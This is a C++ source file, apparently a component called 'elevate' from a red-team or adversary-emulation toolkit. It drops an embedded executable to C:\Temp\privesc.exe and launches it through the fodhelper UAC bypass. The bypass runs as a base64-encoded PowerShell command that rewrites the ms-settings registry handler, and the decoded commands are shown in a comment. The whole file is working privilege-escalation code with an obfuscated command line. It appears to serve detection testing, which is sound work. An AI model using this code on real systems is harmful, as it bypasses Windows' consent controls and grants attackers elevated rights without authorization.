#include "elevate.hpp"

std::string componentName = "elevate";

int wmain() {
	Log("[+] Starting " + componentName + ".", componentName);
	Log("[*] Running as " + GetUserAndContext(), componentName);

	// drop privesc to disk
	Log("[+] Writing privesc to disk.", componentName);
	std::ofstream outfile("C:\\Temp\\privesc.exe", std::ios::out | std::ios::binary);
	outfile.write(&privesc[0], sizeof(privesc));
	outfile.close();

	// bypass UAC and spawn privesc
	// source: https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1548.002/T1548.002.md#atomic-test-4---bypass-uac-using-fodhelper---powershell
	Log("[*] Bypassing UAC and starting privesc.", componentName);

	// powershell.exe -Command New-Item \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Force;
	// New-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name 'DelegateExecute' -Value '' -Force;
	// Set-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name '(default)' -Value 'C:\\Temp\\privesc.exe' -Force;
	// Start-Process \"C:\\Windows\\System32\\fodhelper.exe\";
	std::string cmdline = "powershell.exe -encodedCommand TgBlAHcALQBJAHQAZQBtACAASABLAEMAVQA6AFwAcwBvAGYAdAB3AGEAcgBlAFwAYwBsAGEAcwBzAGUAcwBcAG0AcwAtAHMAZQB0AHQAaQBuAGcAcwBcAHMAaABlAGwAbABcAG8AcABlAG4AXABjAG8AbQBtAGEAbgBkACAALQBGAG8AcgBjAGUAOwAgAE4AZQB3AC0ASQB0AGUAbQBQAHIAbwBwAGUAcgB0AHkAIABIAEsAQwBVADoAXABzAG8AZgB0AHcAYQByAGUAXABjAGwAYQBzAHMAZQBzAFwAbQBzAC0AcwBlAHQAdABpAG4AZwBzAFwAcwBoAGUAbABsAFwAbwBwAGUAbgBcAGMAbwBtAG0AYQBuAGQAIAAtAE4AYQBtAGUAIAAnAEQAZQBsAGUAZwBhAHQAZQBFAHgAZQBjAHUAdABlACcAIAAtAFYAYQBsAHUAZQAgACcAJwAgAC0ARgBvAHIAYwBlADsAIABTAGUAdAAtAEkAdABlAG0AUAByAG8AcABlAHIAdAB5ACAASABLAEMAVQA6AFwAcwBvAGYAdAB3AGEAcgBlAFwAYwBsAGEAcwBzAGUAcwBcAG0AcwAtAHMAZQB0AHQAaQBuAGcAcwBcAHMAaABlAGwAbABcAG8AcABlAG4AXABjAG8AbQBtAGEAbgBkACAALQBOAGEAbQBlACAAJwAoAGQAZQBmAGEAdQBsAHQAKQAnACAALQBWAGEAbAB1AGUAIAAnAEMAOgBcAFQAZQBtAHAAXABwAHIAaQB2AGUAcwBjAC4AZQB4AGUAJwAgAC0ARgBvAHIAYwBlADsAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFMAeQBzAHQAZQBtADMAMgBcAGYAbwBkAGgAZQBsAHAAZQByAC4AZQB4AGUAOwA=";

	CreateProc("privesc", cmdline);

	return 0;
}